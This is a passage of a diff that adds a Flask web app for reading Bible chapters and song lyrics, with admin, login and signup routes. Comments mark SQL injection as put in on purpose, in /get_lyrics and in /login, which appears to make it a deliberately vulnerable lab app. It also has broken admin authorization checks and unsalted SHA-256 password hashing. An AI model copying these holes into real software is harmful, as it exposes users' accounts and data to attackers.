'Eze 31'], [834, 26, 32, 'Ezekiel 32', 'Eze 32'], [835, 26, 33, 'Ezekiel 33', 'Eze 33'], [836, 26, 34, 'Ezekiel 34', 'Eze 34'], [837, 26, 35, 'Ezekiel 35', 'Eze 35'], [838, 26, 36, 'Ezekiel 36', 'Eze 36'], [839, 26, 37, 'Ezekiel 37', 'Eze 37'], [840, 26, 38, 'Ezekiel 38', 'Eze 38'], [841, 26, 39, 'Ezekiel 39', 'Eze 39'], [842, 26, 40, 'Ezekiel 40', 'Eze 40'], [843, 26, 41, 'Ezekiel 41', 'Eze 41'], [844, 26, 42, 'Ezekiel 42', 'Eze 42'], [845, 26, 43, 'Ezekiel 43', 'Eze 43'], [846, 26, 44, 'Ezekiel 44', 'Eze 44'], [847, 26, 45, 'Ezekiel 45', 'Eze 45'], [848, 26, 46, 'Ezekiel 46', 'Eze 46'], [849, 26, 47, 'Ezekiel 47', 'Eze 47'], [850, 26, 48, 'Ezekiel 48', 'Eze 48'], [851, 27, 1, 'Daniel 1', 'Dan 1'], [852, 27, 2, 'Daniel 2', 'Dan 2'], [853, 27, 3, 'Daniel 3', 'Dan 3'], [854, 27, 4, 'Daniel 4', 'Dan 4'], [855, 27, 5, 'Daniel 5', 'Dan 5'], [856, 27, 6, 'Daniel 6', 'Dan 6'], [857, 27, 7, 'Daniel 7', 'Dan 7'], [858, 27, 8, 'Daniel 8', 'Dan 8'], [859, 27, 9, 'Daniel 9', 'Dan 9'], [860, 27, 10, 'Daniel 10', 'Dan 10'], [861, 27, 11, 'Daniel 11', 'Dan 11'], [862, 27, 12, 'Daniel 12', 'Dan 12'], [863, 28, 1, 'Hosea 1', 'Hos 1'], [864, 28, 2, 'Hosea 2', 'Hos 2'], [865, 28, 3, 'Hosea 3', 'Hos 3'], [866, 28, 4, 'Hosea 4', 'Hos 4'], [867, 28, 5, 'Hosea 5', 'Hos 5'], [868, 28, 6, 'Hosea 6', 'Hos 6'], [869, 28, 7, 'Hosea 7', 'Hos 7'], [870, 28, 8, 'Hosea 8', 'Hos 8'], [871, 28, 9, 'Hosea 9', 'Hos 9'], [872, 28, 10, 'Hosea 10', 'Hos 10'], [873, 28, 11, 'Hosea 11', 'Hos 11'], [874, 28, 12, 'Hosea 12', 'Hos 12'], [875, 28, 13, 'Hosea 13', 'Hos 13'], [876, 28, 14, 'Hosea 14', 'Hos 14'], [877, 29, 1, 'Joel 1', 'Joe 1'], [878, 29, 2, 'Joel 2', 'Joe 2'], [879, 29, 3, 'Joel 3', 'Joe 3'], [880, 30, 1, 'Amos 1', 'Amo 1'], [881, 30, 2, 'Amos 2', 'Amo 2'], [882, 30, 3, 'Amos 3', 'Amo 3'], [883, 30, 4, 'Amos 4', 'Amo 4'], [884, 30, 5, 'Amos 5', 'Amo 5'], [885, 30, 6, 'Amos 6', 'Amo 6'], [886, 30, 7, 'Amos 7', 'Amo 7'], [887, 30, 8, 'Amos 8', 'Amo 8'], [888, 30, 9, 'Amos 9', 'Amo 9'], [889, 31, 1, 'Obadiah 1', 'Oba 1'], [890, 32, 1, 'Jonah 1', 'Jon 1'], [891, 32, 2, 'Jonah 2', 'Jon 2'], [892, 32, 3, 'Jonah 3', 'Jon 3'], [893, 32, 4, 'Jonah 4', 'Jon 4'], [894, 33, 1, 'Micah 1', 'Mic 1'], [895, 33, 2, 'Micah 2', 'Mic 2'], [896, 33, 3, 'Micah 3', 'Mic 3'], [897, 33, 4, 'Micah 4', 'Mic 4'], [898, 33, 5, 'Micah 5', 'Mic 5'], [899, 33, 6, 'Micah 6', 'Mic 6'], [900, 33, 7, 'Micah 7', 'Mic 7'], [901, 34, 1, 'Nahum 1', 'Nah 1'], [902, 34, 2, 'Nahum 2', 'Nah 2'], [903, 34, 3, 'Nahum 3', 'Nah 3'], [904, 35, 1, 'Habakkuk 1', 'Hab 1'], [905, 35, 2, 'Habakkuk 2', 'Hab 2'], [906, 35, 3, 'Habakkuk 3', 'Hab 3'], [907, 36, 1, 'Zephaniah 1', 'Zep 1'], [908, 36, 2, 'Zephaniah 2', 'Zep 2'], [909, 36, 3, 'Zephaniah 3', 'Zep 3'], [910, 37, 1, 'Haggai 1', 'Hag 1'], [911, 37, 2, 'Haggai 2', 'Hag 2'], [912, 38, 1, 'Zechariah 1', 'Zec 1'], [913, 38, 2, 'Zechariah 2', 'Zec 2'], [914, 38, 3, 'Zechariah 3', 'Zec 3'], [915, 38, 4, 'Zechariah 4', 'Zec 4'], [916, 38, 5, 'Zechariah 5', 'Zec 5'], [917, 38, 6, 'Zechariah 6', 'Zec 6'], [918, 38, 7, 'Zechariah 7', 'Zec 7'], [919, 38, 8, 'Zechariah 8', 'Zec 8'], [920, 38, 9, 'Zechariah 9', 'Zec 9'], [921, 38, 10, 'Zechariah 10', 'Zec 10'], [922, 38, 11, 'Zechariah 11', 'Zec 11'], [923, 38, 12, 'Zechariah 12', 'Zec 12'], [924, 38, 13, 'Zechariah 13', 'Zec 13'], [925, 38, 14, 'Zechariah 14', 'Zec 14'], [926, 39, 1, 'Malachi 1', 'Mal 1'], [927, 39, 2, 'Malachi 2', 'Mal 2'], [928, 39, 3, 'Malachi 3', 'Mal 3'], [929, 39, 4, 'Malachi 4', 'Mal 4'], [930, 40, 1, 'Matthew 1', 'Mat 1'], [931, 40, 2, 'Matthew 2', 'Mat 2'], [932, 40, 3, 'Matthew 3', 'Mat 3'], [933, 40, 4, 'Matthew 4', 'Mat 4'], [934, 40, 5, 'Matthew 5', 'Mat 5'], [935, 40, 6, 'Matthew 6', 'Mat 6'], [936, 40, 7, 'Matthew 7', 'Mat 7'], [937, 40, 8, 'Matthew 8', 'Mat 8'], [938, 40, 9, 'Matthew 9', 'Mat 9'], [939, 40, 10, 'Matthew 10', 'Mat 10'], [940, 40, 11, 'Matthew 11', 'Mat 11'], [941, 40, 12, 'Matthew 12', 'Mat 12'], [942, 40, 13, 'Matthew 13', 'Mat 13'], [943, 40, 14, 'Matthew 14', 'Mat 14'], [944, 40, 15, 'Matthew 15', 'Mat 15'], [945, 40, 16, 'Matthew 16', 'Mat 16'], [946, 40, 17, 'Matthew 17', 'Mat 17'], [947, 40, 18, 'Matthew 18', 'Mat 18'], [948, 40, 19, 'Matthew 19', 'Mat 19'], [949, 40, 20, 'Matthew 20', 'Mat 20'], [950, 40, 21, 'Matthew 21', 'Mat 21'], [951, 40, 22, 'Matthew 22', 'Mat 22'], [952, 40, 23, 'Matthew 23', 'Mat 23'], [953, 40, 24, 'Matthew 24', 'Mat 24'], [954, 40, 25, 'Matthew 25', 'Mat 25'], [955, 40, 26, 'Matthew 26', 'Mat 26'], [956, 40, 27, 'Matthew 27', 'Mat 27'], [957, 40, 28, 'Matthew 28', 'Mat 28'], [958, 41, 1, 'Mark 1', 'Mar 1'], [959, 41, 2, 'Mark 2', 'Mar 2'], [960, 41, 3, 'Mark 3', 'Mar 3'], [961, 41, 4, 'Mark 4', 'Mar 4'], [962, 41, 5, 'Mark 5', 'Mar 5'], [963, 41, 6, 'Mark 6', 'Mar 6'], [964, 41, 7, 'Mark 7', 'Mar 7'], [965, 41, 8, 'Mark 8', 'Mar 8'], [966, 41, 9, 'Mark 9', 'Mar 9'], [967, 41, 10, 'Mark 10', 'Mar 10'], [968, 41, 11, 'Mark 11', 'Mar 11'], [969, 41, 12, 'Mark 12', 'Mar 12'], [970, 41, 13, 'Mark 13', 'Mar 13'], [971, 41, 14, 'Mark 14', 'Mar 14'], [972, 41, 15, 'Mark 15', 'Mar 15'], [973, 41, 16, 'Mark 16', 'Mar 16'], [974, 42, 1, 'Luke 1', 'Luk 1'], [975, 42, 2, 'Luke 2', 'Luk 2'], [976, 42, 3, 'Luke 3', 'Luk 3'], [977, 42, 4, 'Luke 4', 'Luk 4'], [978, 42, 5, 'Luke 5', 'Luk 5'], [979, 42, 6, 'Luke 6', 'Luk 6'], [980, 42, 7, 'Luke 7', 'Luk 7'], [981, 42, 8, 'Luke 8', 'Luk 8'], [982, 42, 9, 'Luke 9', 'Luk 9'], [983, 42, 10, 'Luke 10', 'Luk 10'], [984, 42, 11, 'Luke 11', 'Luk 11'], [985, 42, 12, 'Luke 12', 'Luk 12'], [986, 42, 13, 'Luke 13', 'Luk 13'], [987, 42, 14, 'Luke 14', 'Luk 14'], [988, 42, 15, 'Luke 15', 'Luk 15'], [989, 42, 16, 'Luke 16', 'Luk 16'], [990, 42, 17, 'Luke 17', 'Luk 17'], [991, 42, 18, 'Luke 18', 'Luk 18'], [992, 42, 19, 'Luke 19', 'Luk 19'], [993, 42, 20, 'Luke 20', 'Luk 20'], [994, 42, 21, 'Luke 21', 'Luk 21'], [995, 42, 22, 'Luke 22', 'Luk 22'], [996, 42, 23, 'Luke 23', 'Luk 23'], [997, 42, 24, 'Luke 24', 'Luk 24'], [998, 43, 1, 'John 1', 'Joh 1'], [999, 43, 2, 'John 2', 'Joh 2'], [1000, 43, 3, 'John 3', 'Joh 3'], [1001, 43, 4, 'John 4', 'Joh 4'], [1002, 43, 5, 'John 5', 'Joh 5'], [1003, 43, 6, 'John 6', 'Joh 6'], [1004, 43, 7, 'John 7', 'Joh 7'], [1005, 43, 8, 'John 8', 'Joh 8'], [1006, 43, 9, 'John 9', 'Joh 9'], [1007, 43, 10, 'John 10', 'Joh 10'], [1008, 43, 11, 'John 11', 'Joh 11'], [1009, 43, 12, 'John 12', 'Joh 12'], [1010, 43, 13, 'John 13', 'Joh 13'], [1011, 43, 14, 'John 14', 'Joh 14'], [1012, 43, 15, 'John 15', 'Joh 15'], [1013, 43, 16, 'John 16', 'Joh 16'], [1014, 43, 17, 'John 17', 'Joh 17'], [1015, 43, 18, 'John 18', 'Joh 18'], [1016, 43, 19, 'John 19', 'Joh 19'], [1017, 43, 20, 'John 20', 'Joh 20'], [1018, 43, 21, 'John 21', 'Joh 21'], [1019, 44, 1, 'Acts 1', 'Act 1'], [1020, 44, 2, 'Acts 2', 'Act 2'], [1021, 44, 3, 'Acts 3', 'Act 3'], [1022, 44, 4, 'Acts 4', 'Act 4'], [1023, 44, 5, 'Acts 5', 'Act 5'], [1024, 44, 6, 'Acts 6', 'Act 6'], [1025, 44, 7, 'Acts 7', 'Act 7'], [1026, 44, 8, 'Acts 8', 'Act 8'], [1027, 44, 9, 'Acts 9', 'Act 9'], [1028, 44, 10, 'Acts 10', 'Act 10'], [1029, 44, 11, 'Acts 11', 'Act 11'], [1030, 44, 12, 'Acts 12', 'Act 12'], [1031, 44, 13, 'Acts 13', 'Act 13'], [1032, 44, 14, 'Acts 14', 'Act 14'], [1033, 44, 15, 'Acts 15', 'Act 15'], [1034, 44, 16, 'Acts 16', 'Act 16'], [1035, 44, 17, 'Acts 17', 'Act 17'], [1036, 44, 18, 'Acts 18', 'Act 18'], [1037, 44, 19, 'Acts 19', 'Act 19'], [1038, 44, 20, 'Acts 20', 'Act 20'], [1039, 44, 21, 'Acts 21', 'Act 21'], [1040, 44, 22, 'Acts 22', 'Act 22'], [1041, 44, 23, 'Acts 23', 'Act 23'], [1042, 44, 24, 'Acts 24', 'Act 24'], [1043, 44, 25, 'Acts 25', 'Act 25'], [1044, 44, 26, 'Acts 26', 'Act 26'], [1045, 44, 27, 'Acts 27', 'Act 27'], [1046, 44, 28, 'Acts 28', 'Act 28'], [1047, 45, 1, 'Romans 1', 'Rom 1'], [1048, 45, 2, 'Romans 2', 'Rom 2'], [1049, 45, 3, 'Romans 3', 'Rom 3'], [1050, 45, 4, 'Romans 4', 'Rom 4'], [1051, 45, 5, 'Romans 5', 'Rom 5'], [1052, 45, 6, 'Romans 6', 'Rom 6'], [1053, 45, 7, 'Romans 7', 'Rom 7'], [1054, 45, 8, 'Romans 8', 'Rom 8'], [1055, 45, 9, 'Romans 9', 'Rom 9'], [1056, 45, 10, 'Romans 10', 'Rom 10'], [1057, 45, 11, 'Romans 11', 'Rom 11'], [1058, 45, 12, 'Romans 12', 'Rom 12'], [1059, 45, 13, 'Romans 13', 'Rom 13'], [1060, 45, 14, 'Romans 14', 'Rom 14'], [1061, 45, 15, 'Romans 15', 'Rom 15'], [1062, 45, 16, 'Romans 16', 'Rom 16'], [1063, 46, 1, '1 Corinthians 1', '1 Cor 1'], [1064, 46, 2, '1 Corinthians 2', '1 Cor 2'], [1065, 46, 3, '1 Corinthians 3', '1 Cor 3'], [1066, 46, 4, '1 Corinthians 4', '1 Cor 4'], [1067, 46, 5, '1 Corinthians 5', '1 Cor 5'], [1068, 46, 6, '1 Corinthians 6', '1 Cor 6'], [1069, 46, 7, '1 Corinthians 7', '1 Cor 7'], [1070, 46, 8, '1 Corinthians 8', '1 Cor 8'], [1071, 46, 9, '1 Corinthians 9', '1 Cor 9'], [1072, 46, 10, '1 Corinthians 10', '1 Cor 10'], [1073, 46, 11, '1 Corinthians 11', '1 Cor 11'], [1074, 46, 12, '1 Corinthians 12', '1 Cor 12'], [1075, 46, 13, '1 Corinthians 13', '1 Cor 13'], [1076, 46, 14, '1 Corinthians 14', '1 Cor 14'], [1077, 46, 15, '1 Corinthians 15', '1 Cor 15'], [1078, 46, 16, '1 Corinthians 16', '1 Cor 16'], [1079, 47, 1, '2 Corinthians 1', '2 Cor 1'], [1080, 47, 2, '2 Corinthians 2', '2 Cor 2'], [1081, 47, 3, '2 Corinthians 3', '2 Cor 3'], [1082, 47, 4, '2 Corinthians 4', '2 Cor 4'], [1083, 47, 5, '2 Corinthians 5', '2 Cor 5'], [1084, 47, 6, '2 Corinthians 6', '2 Cor 6'], [1085, 47, 7, '2 Corinthians 7', '2 Cor 7'], [1086, 47, 8, '2 Corinthians 8', '2 Cor 8'], [1087, 47, 9, '2 Corinthians 9', '2 Cor 9'], [1088, 47, 10, '2 Corinthians 10', '2 Cor 10'], [1089, 47, 11, '2 Corinthians 11', '2 Cor 11'], [1090, 47, 12, '2 Corinthians 12', '2 Cor 12'], [1091, 47, 13, '2 Corinthians 13', '2 Cor 13'], [1092, 48, 1, 'Galatians 1', 'Gal 1'], [1093, 48, 2, 'Galatians 2', 'Gal 2'], [1094, 48, 3, 'Galatians 3', 'Gal 3'], [1095, 48, 4, 'Galatians 4', 'Gal 4'], [1096, 48, 5, 'Galatians 5', 'Gal 5'], [1097, 48, 6, 'Galatians 6', 'Gal 6'], [1098, 49, 1, 'Ephesians 1', 'Eph 1'], [1099, 49, 2, 'Ephesians 2', 'Eph 2'], [1100, 49, 3, 'Ephesians 3', 'Eph 3'], [1101, 49, 4, 'Ephesians 4', 'Eph 4'], [1102, 49, 5, 'Ephesians 5', 'Eph 5'], [1103, 49, 6, 'Ephesians 6', 'Eph 6'], [1104, 50, 1, 'Philippians 1', 'Phi 1'], [1105, 50, 2, 'Philippians 2', 'Phi 2'], [1106, 50, 3, 'Philippians 3', 'Phi 3'], [1107, 50, 4, 'Philippians 4', 'Phi 4'], [1108, 51, 1, 'Colossians 1', 'Col 1'], [1109, 51, 2, 'Colossians 2', 'Col 2'], [1110, 51, 3, 'Colossians 3', 'Col 3'], [1111, 51, 4, 'Colossians 4', 'Col 4'], [1112, 52, 1, '1 Thessalonians 1', '1 The 1'], [1113, 52, 2, '1 Thessalonians 2', '1 The 2'], [1114, 52, 3, '1 Thessalonians 3', '1 The 3'], [1115, 52, 4, '1 Thessalonians 4', '1 The 4'], [1116, 52, 5, '1 Thessalonians 5', '1 The 5'], [1117, 53, 1, '2 Thessalonians 1', '2 The 1'], [1118, 53, 2, '2 Thessalonians 2', '2 The 2'], [1119, 53, 3, '2 Thessalonians 3', '2 The 3'], [1120, 54, 1, '1 Timothy 1', '1 Tim 1'], [1121, 54, 2, '1 Timothy 2', '1 Tim 2'], [1122, 54, 3, '1 Timothy 3', '1 Tim 3'], [1123, 54, 4, '1 Timothy 4', '1 Tim 4'], [1124, 54, 5, '1 Timothy 5', '1 Tim 5'], [1125, 54, 6, '1 Timothy 6', '1 Tim 6'], [1126, 55, 1, '2 Timothy 1', '2 Tim 1'], [1127, 55, 2, '2 Timothy 2', '2 Tim 2'], [1128, 55, 3, '2 Timothy 3', '2 Tim 3'], [1129, 55, 4, '2 Timothy 4', '2 Tim 4'], [1130, 56, 1, 'Titus 1', 'Tit 1'], [1131, 56, 2, 'Titus 2', 'Tit 2'], [1132, 56, 3, 'Titus 3', 'Tit 3'], [1133, 57, 1, 'Philemon 1', 'Phi 1'], [1134, 58, 1, 'Hebrews 1', 'Heb 1'], [1135, 58, 2, 'Hebrews 2', 'Heb 2'], [1136, 58, 3, 'Hebrews 3', 'Heb 3'], [1137, 58, 4, 'Hebrews 4', 'Heb 4'], [1138, 58, 5, 'Hebrews 5', 'Heb 5'], [1139, 58, 6, 'Hebrews 6', 'Heb 6'], [1140, 58, 7, 'Hebrews 7', 'Heb 7'], [1141, 58, 8, 'Hebrews 8', 'Heb 8'], [1142, 58, 9, 'Hebrews 9', 'Heb 9'], [1143, 58, 10, 'Hebrews 10', 'Heb 10'], [1144, 58, 11, 'Hebrews 11', 'Heb 11'], [1145, 58, 12, 'Hebrews 12', 'Heb 12'], [1146, 58, 13, 'Hebrews 13', 'Heb 13'], [1147, 59, 1, 'James 1', 'Jam 1'], [1148, 59, 2, 'James 2', 'Jam 2'], [1149, 59, 3, 'James 3', 'Jam 3'], [1150, 59, 4, 'James 4', 'Jam 4'], [1151, 59, 5, 'James 5', 'Jam 5'], [1152, 60, 1, '1 Peter 1', '1 Pet 1'], [1153, 60, 2, '1 Peter 2', '1 Pet 2'], [1154, 60, 3, '1 Peter 3', '1 Pet 3'], [1155, 60, 4, '1 Peter 4', '1 Pet 4'], [1156, 60, 5, '1 Peter 5', '1 Pet 5'], [1157, 61, 1, '2 Peter 1', '2 Pet 1'], [1158, 61, 2, '2 Peter 2', '2 Pet 2'], [1159, 61, 3, '2 Peter 3', '2 Pet 3'], [1160, 62, 1, '1 John 1', '1 Joh 1'], [1161, 62, 2, '1 John 2', '1 Joh 2'], [1162, 62, 3, '1 John 3', '1 Joh 3'], [1163, 62, 4, '1 John 4', '1 Joh 4'], [1164, 62, 5, '1 John 5', '1 Joh 5'], [1165, 63, 1, '2 John 1', '2 Joh 1'], [1166, 64, 1, '3 John 1', '3 Joh 1'], [1167, 65, 1, 'Jude 1', 'Jud 1'], [1168, 66, 1, 'Revelation 1', 'Rev 1'], [1169, 66, 2, 'Revelation 2', 'Rev 2'], [1170, 66, 3, 'Revelation 3', 'Rev 3'], [1171, 66, 4, 'Revelation 4', 'Rev 4'], [1172, 66, 5, 'Revelation 5', 'Rev 5'], [1173, 66, 6, 'Revelation 6', 'Rev 6'], [1174, 66, 7, 'Revelation 7', 'Rev 7'], [1175, 66, 8, 'Revelation 8', 'Rev 8'], [1176, 66, 9, 'Revelation 9', 'Rev 9'], [1177, 66, 10, 'Revelation 10', 'Rev 10'], [1178, 66, 11, 'Revelation 11', 'Rev 11'], [1179, 66, 12, 'Revelation 12', 'Rev 12'], [1180, 66, 13, 'Revelation 13', 'Rev 13'], [1181, 66, 14, 'Revelation 14', 'Rev 14'], [1182, 66, 15, 'Revelation 15', 'Rev 15'], [1183, 66, 16, 'Revelation 16', 'Rev 16'], [1184, 66, 17, 'Revelation 17', 'Rev 17'], [1185, 66, 18, 'Revelation 18', 'Rev 18'], [1186, 66, 19, 'Revelation 19', 'Rev 19'], [1187, 66, 20, 'Revelation 20', 'Rev 20'], [1188, 66, 21, 'Revelation 21', 'Rev 21'], [1189, 66, 22, 'Revelation 22', 'Rev 22']]
+
+
+@app.route('/bible')
+def bible():
+    global result_list
+    if 'username' in session:
+        login = True
+        user = session['username']
+    else:
+        login = False
+        user = ""
+
+    return render_template("bible.html", login=login, user=user, rows=result_list)
+
+
+def bible_db(db_val, selected_id):
+    dbs = ['kjv.db', 'hindi_unicode.db', 'tamil.db', 'telugu.db']
+    conn = sqlite3.connect(dbs[db_val])
+    cursor = conn.cursor()
+    bookNum = result_list[selected_id][1]
+    chNum = result_list[selected_id][2]
+    # Execute a query to select data from the 'songs' table for the selected ID
+    cursor.execute(
+        'SELECT * FROM words WHERE bookNum = ? AND chNum = ?', (bookNum, chNum,))
+    row = cursor.fetchall()
+    conn.close()
+    return row
+
+
+@app.route('/get_verse', methods=['POST'])
+def get_verse():
+    global result_list
+    data = request.get_json()
+    selected_id = int(data['id']) - 1
+    # print("data", result_list[selected_id])
+    language = int(data['language'])
+    split = int(data['split'])
+
+    if split == 0:
+        row = bible_db(language, selected_id)
+        lyrics = ""
+        if row:
+            for i in (row):
+                # print(row[i][1])
+                lyrics += f"<p id={i[4]} style='border: 1px solid black;padding: 10px;'>" + "<span style='font-weight:bold;font-size:larger;'>" + \
+                    result_list[selected_id][3] + ":" + \
+                    str(i[4]) + "</span><br>" + i[1] + "</p>"
+
+            # print(lyrics)
+            return jsonify({'lyrics': lyrics, 'title': result_list[selected_id][3]})
+        else:
+            return jsonify({'lyrics': [], 'title': []})
+
+    if split == 1:
+        row = bible_db(0, selected_id)
+        row1 = bible_db(language, selected_id)
+        lyrics = ""
+        if row:
+            for i in range(len(row)):
+                # print(row[i][1])
+                lyrics += f"<p id={row[i][4]} style='border: 1px solid black;padding: 10px;'>" + "<span style='font-weight:bold;font-size:larger;'>" + \
+                    result_list[selected_id][3] + ":" + str(
+                        row[i][4]) + "</span><br>" + row[i][1] + f"<br><span style='color:green;'>{row1[i][1]}</span></p>"
+
+            # print(lyrics)
+            return jsonify({'lyrics': lyrics, 'title': result_list[selected_id][3]})
+        else:
+            return jsonify({'lyrics': [], 'title': []})
+
+    if split == 2:
+        row = bible_db(0, selected_id)
+        row1 = bible_db(language, selected_id)
+        lyrics = ""
+        if row:
+            for i in range(len(row)):
+                # print(row[i][1])
+                lyrics += f"<p id={row[i][4]} style='border: 1px solid black;padding: 10px;'>" + "<span style='font-weight:bold;font-size:larger;'>" + result_list[selected_id][3] + ":" + str(
+                    row[i][4]) + "</span><br>" + row[i][1] + "</p>" + f"<p id={row[i][4]} style='border: 1px solid black;padding: 10px;'>" + "<span style='font-weight:bold;font-size:larger;'>" + result_list[selected_id][3] + ":" + str(row[i][4]) + "</span><br>" + f"<span style='color:green;'>{row1[i][1]}</span></p>"
+
+            # print(lyrics)
+            return jsonify({'lyrics': lyrics, 'title': result_list[selected_id][3]})
+        else:
+            return jsonify({'lyrics': [], 'title': []})
+
+
+@app.route('/admincontrol')
+def admin_dashboard():
+    try:
+        if 'username' not in session and session['username'] != "samjose":
+            return "Not Authorized"
+
+        conn=create_connection()
+        cursor = conn.cursor()
+
+        cursor.execute('SELECT * from users')
+        rows = cursor.fetchall()
+
+        conn.close()
+
+        return render_template("admin_dashboard.html", users=rows)
+    except:
+        return "Login as Admin"
+
+
+@app.route('/modify_user/<int:user_id>')
+def modify_user(user_id):
+    # Fetch user data by user_id and perform modification logic here
+    conn = create_connection()
+    cursor = conn.cursor()
+
+    # Fetch the current permission value
+    cursor.execute('SELECT permission FROM users WHERE id = ?', (user_id,))
+    current_permission = cursor.fetchone()[0]
+
+    # Increment permission, reset to 0 if it exceeds 3
+    new_permission = (current_permission + 1) % 4
+
+    # Update the permission in the database
+    cursor.execute('UPDATE users SET permission = ? WHERE id = ?', (new_permission, user_id))
+    conn.commit()
+    conn.close()
+
+    return redirect(url_for('admin_dashboard'))
+
+
+
+@app.route('/delete_user/<int:user_id>')
+def delete_user(user_id):
+    if 'username' not in session and session['username'] != "samjose":
+        return "Not Authorized"
+
+    # Logic to delete user
+    conn=create_connection()
+    cursor = conn.cursor()
+
+    cursor.execute('DELETE FROM users WHERE id = ?', (user_id,))
+    conn.commit()
+
+    conn.close()
+
+    return redirect(url_for('admin_dashboard'))
+
+
+@app.route('/get_lyrics', methods=['POST'])
+def get_lyrics():
+    data = request.get_json()
+    selected_id = data['id']
+    # print("ids", selected_id)
+
+    # Connect to the SQLite database
+    conn = create_connection()
+    cursor = conn.cursor()
+
+    # Execute a query to select data from the 'songs' table for the selected ID
+    # This line has been modified to be vulnerable to SQL injection
+    query = f"SELECT lyrics, transliteration, chord, title FROM songs WHERE id = {selected_id}"
+    cursor.execute(query)
+
+    row = cursor.fetchone()
+    # print(row)
+
+    # Close the database connection
+    conn.close()
+    print(row)
+    if row:
+        lyrics = song_view(row[0], sanitize_html(row[1]), sanitize_html(row[2]))
+        # print(lyrics)
+        return jsonify({'lyrics': lyrics, 'title': row[3]})
+    else:
+        return jsonify({'lyrics': [], 'title': []})
+
+
+
+@app.route('/song/<id>')
+def song(id):
+    try:
+        # Connect to the SQLite database
+        conn=create_connection()
+        cursor = conn.cursor()
+
+        # Execute a query to select data from the 'songs' table for the selected ID
+        cursor.execute(
+            'SELECT lyrics, transliteration, chord, title, youtube_link FROM songs WHERE id = ?', (int(id),))
+
+        row = cursor.fetchone()
+        # print(row)
+
+        # Close the database connection
+        conn.close()
+
+        lyrics = song_view(sanitize_html(row[0]), sanitize_html(row[1]), row[2])
+    except:
+        conn.close()
+        return "Song Not Available!"
+
+    # print("HI")
+
+    return render_template("song_viewer.html", lyrics=lyrics, song_title=row[3], link=row[4])
+
+
+@app.route('/control/<user>')
+def control(user):
+    if 'username' not in session:
+        return render_template('login.html', error_message="Kindly Login to access controls Page!", error_color='red')
+    login = True
+    try:
+        # Connect to the SQLite database
+        conn = sqlite3.connect('logs.db')
+        cursor = conn.cursor()
+
+        # Define the current user
+        current_user = session['username']
+
+        # Execute the SQL query
+        cursor.execute('''
+            SELECT * FROM controls
+            WHERE user = ? 
+            AND time >= datetime('now', '-5 hours')
+            ORDER BY time DESC
+            LIMIT 1
+        ''', (current_user,))
+
+        # Fetch the result
+        result = cursor.fetchone()
+
+        # Check if a row was found
+        if result:
+            data = result[3]
+        else:
+            print("No rows found for user ")
+            data = ""
+
+    except sqlite3.Error as e:
+        print("Error accessing SQLite database:", e)
+    print(user)
+    return render_template("control.html", login=login, user=session['username'], data=data)
+
+
+@app.route('/display/<user>')
+def display(user):
+    print(user)
+
+    return render_template("display.html", user=user)
+
+
+@socketio.on('join')
+def handle_join(user):
+    room = user
+    join_room(room)
+    insert_logs(user)
+
+
+@socketio.on('send_data_event')
+def send_data(data):
+    room = data.get('user')
+    emitted_data = data.get('data')
+    if room and emitted_data:
+        emit('update_data', emitted_data, room=room)
+        insert_control(room, emitted_data)
+
+
+@socketio.on('send_para')
+def send_para(data):
+    room = data.get('user')
+    emitted_data = data.get('data')
+    if room and emitted_data:
+        emit('update_para', emitted_data, room=room)
+        insert_details(room, emitted_data)
+
+# Function to fetch data from the database
+
+
+def fetch_data(table_name):
+    conn = sqlite3.connect('logs.db')
+    cursor = conn.cursor()
+    cursor.execute(f"SELECT * FROM {table_name}")
+    data = cursor.fetchall()
+    conn.close()
+    return data
+
+# Route to display all tables
+
+
+@app.route('/adminpanel')
+def admin_view():
+    if 'username' in session:
+        log_details_data = fetch_data('log_details')
+        details_data = fetch_data('details')
+        controls_data = fetch_data('controls')
+        return render_template('admin_view.html', log_details_data=log_details_data, details_data=details_data, controls_data=controls_data)
+    else:
+        return "Not Authorized to view this page"
+
+
+@app.route('/signup', methods=['GET', 'POST'])
+def signup():
+    if 'username' in session:
+        return redirect(url_for('dashboard'))
+
+    if request.method == 'POST':
+        username = request.form['username']
+        email = request.form['email']
+        password = request.form['password']
+
+        conn = create_connection()
+        cursor = conn.cursor()
+
+        # Check if username or email already exists
+        cursor.execute(
+            "SELECT * FROM users WHERE username = ? OR email = ?", (username, email))
+        existing_user = cursor.fetchone()
+
+        if existing_user:
+            error_message = "Username or email already exists!"
+            conn.close()
+            return render_template('signup.html', error_message=error_message, error_color='red')
+
+        # Hash the password before storing it
+        hashed_password = hashlib.sha256(password.encode()).hexdigest()
+
+        # Insert new user into the database
+        cursor.execute("INSERT INTO users (username, email, password) VALUES (?, ?, ?)",
+                       (username, email, hashed_password))
+        conn.commit()
+        conn.close()
+
+        session['username'] = username
+        return redirect(url_for('login'))
+    return render_template('signup.html')
+
+
+# @app.route('/login', methods=['GET', 'POST'])
+# def login():
+#     if 'username' in session:
+#         return redirect(url_for('dashboard'))
+
+#     if request.method == 'POST':
+#         username_or_email = request.form['username_or_email']
+#         password = request.form['password']
+
+#         conn=create_connection()
+#         cursor = conn.cursor()
+
+#         # Check if the username or email exists in the database
+#         cursor.execute("SELECT * FROM users WHERE username = ? OR email = ?",
+#                        (username_or_email, username_or_email))
+#         user = cursor.fetchone()
+
+#         if user:
+#             # Assuming the password is stored in the fourth column (index 3)
+#             stored_password = user[3]
+#             hashed_password = hashlib.sha256(password.encode()).hexdigest()
+
+#             if hashed_password == stored_password:
+#                 # Authentication successful, set session and redirect to a dashboard or profile page
+#                 # Assuming the username is stored in the second column (index 1)
+#                 session['username'] = user[1]
+#                 conn.close()
+#                 # Replace 'dashboard' with your desired route
+#                 return redirect(url_for('dashboard'))
+#             else:
+#                 error_message = "Incorrect password"
+#                 conn.close()
+#                 return render_template('login.html', error_message=error_message, error_color='red')
+#         else:
+#             error_message = "User not found"
+#             conn.close()
+#             return render_template('login.html', error_message=error_message, error_color='red')
+
+#     return render_template('login.html')
+
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if 'username' in session:
+        return redirect(url_for('dashboard'))
+
+    if request.method == 'POST':
+        username_or_email = request.form['username_or_email']
+        password = request.form['password']
+
+        conn = create_connection()
+        cursor = conn.cursor()
+
+        # Vulnerable SQL query construction
+        query = "SELECT * FROM users WHERE username = '{}' OR email = '{}'".format(username_or_email, username_or_email)
+        cursor.execute(query)
+        user = cursor.fetchone()
+
+        if user:
+            # Assuming the password is stored in the fourth column (index 3)
+            stored_password = user[3]
+            hashed_password = hashlib.sha256(password.encode()).hexdigest()
+
+            if hashed_password == stored_password:
+                # Authentication successful, set session and redirect to a dashboard or profile page
+                # Assuming the username is stored in the second column (index 1)
+                session['username'] = user[1]
